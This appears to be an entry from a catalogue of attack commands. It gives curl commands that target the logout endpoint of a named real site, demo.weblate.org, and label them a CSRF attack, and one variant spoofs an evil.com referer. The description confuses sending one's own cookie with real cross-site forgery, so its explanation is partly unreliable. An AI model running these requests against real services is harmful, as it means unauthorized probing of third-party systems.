---
data: >-
  curl -X GET https://demo.weblate.org/accounts/logout/ -b
  "sessionid=your_session_cookie" -v
tags:
  - web
  - exploit
  - csrf
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:23.647Z'
id: c6f21fe5-79a6-4e86-8a7d-662ff32e025f
verified: false
validated: true
submitted: true
---
# curl-simulate-csrf

## Command

```bash
curl -X GET https://demo.weblate.org/accounts/logout/ -b "sessionid=your_session_cookie" -v
```

## Description

This command simulates a CSRF attack by sending a GET request to the logout endpoint with a victim's session cookie, forcing logout as if triggered from a malicious site.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method for the request | Yes |
| `https://demo.weblate.org/accounts/logout/` | Vulnerable endpoint | Yes |
| `-b "sessionid=your_session_cookie"` | Include session cookie for authenticated request | Yes |
| `-v` | Verbose mode to inspect response | No |

## Examples

### Basic Usage

```bash
curl -X GET https://demo.weblate.org/accounts/logout/ -b "sessionid=abc123" -v
```

### Advanced Usage

```bash
curl -X GET https://demo.weblate.org/accounts/logout/ -b "sessionid=abc123" --referer https://evil.com -v
```

## Expected Output

Response indicating successful logout, such as Set-Cookie clearing the sessionid or redirect to /accounts/login/, without CSRF validation failures.

## Related

- [[Related Procedure: Force-User-Logout-via-CSRF]]
